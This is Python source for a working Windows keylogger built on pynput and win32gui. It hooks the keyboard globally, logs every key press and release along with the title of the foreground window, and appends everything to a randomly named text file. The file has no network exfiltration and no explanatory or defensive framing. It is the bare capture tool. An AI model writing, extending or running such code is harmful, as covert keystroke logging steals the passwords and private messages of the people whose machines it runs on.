import pynput
import base64
import random
import string
import threading
import os
from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow


# generate a random filename for our log file
fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".txt"

"""
def windowlog():
    # watch our current active window and write to our log file if it changes
    currentwindow = (GetWindowText(GetForegroundWindow()))
    while True:
        checkwindow = (GetWindowText(GetForegroundWindow()))
        if currentwindow != checkwindow:
            with open(fname, "a+") as f:
                f.write(f"\n### Window Changed to {checkwindow} ###\n")
            currentwindow = checkwindow
"""

def log():

    def on_press(key):
        global currentwindow
        checkwindow = (GetWindowText(GetForegroundWindow()))
        if currentwindow != checkwindow:
            with open(fname, "a+") as f:
                f.write("\n\n")
                f.write(f"### Window Changed to \"{checkwindow}\" ###")
                f.write("\n")
            currentwindow = checkwindow
        kl = []
        ks = str(key).strip("'")
        kl.append(ks)
        log_file(kl)
        kl = []

    def on_release(key):
        onreleasekeys = ["Key.cmd", "Key.ctrl_l", "Key.ctrl_r", "Key.alt_gr", "Key.alt", "Key.delete"]
        klr = []
        ksr = str(key).strip("'")
        klr.append(ksr)
        log_file_release(klr)
        klr = []

    def log_file_release(klr):
        with open(fname, "a+") as f:
            for key in klr:
                if "Key.cmd" in key:
                    f.write(" {cmd_r} ")
                elif "Key.ctrl_l" in key:
                    f.write(" {lctrl_r} ")
                elif "Key.ctrl_r" in key:
                    f.write(" {rctrl_r} ")
                elif "Key.alt_gr" in key:
                    f.write(" {altgr_r} ")
                elif "Key.alt" in key:
                    f.write(" {alt_r} ")
                elif "Key.shift" in key:
                    f.write(" {sft_r} ")
                else:
                    continue

    def log_file(kl):
        with open(fname, "a+") as f:
            for key in kl:
                if "Key.space" in key:
                    f.write(" {sp} ")
                elif "Key.backspace" in key:
                    f.write(" {bsp} ")
                elif "Key.enter" in key:
                    f.write(" {ent} ")
                elif "Key.tab" in key:
                    f.write(" {tab} ")
                elif "Key.caps_lock" in key:
                    f.write(" {cLok} ")
                elif "Key.delete" in key:
                    f.write(" {del} ")
                elif "Key.ctrl_l" in key:
                    f.write(" {lctrl} ")
                elif "Key.ctrl_r" in key:
                    f.write(" {rctrl} ")
                elif "Key.shift" in key:
                    f.write(" {sft} ")
                else:
                    f.write(key)

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()


currentwindow = (GetWindowText(GetForegroundWindow()))

log()
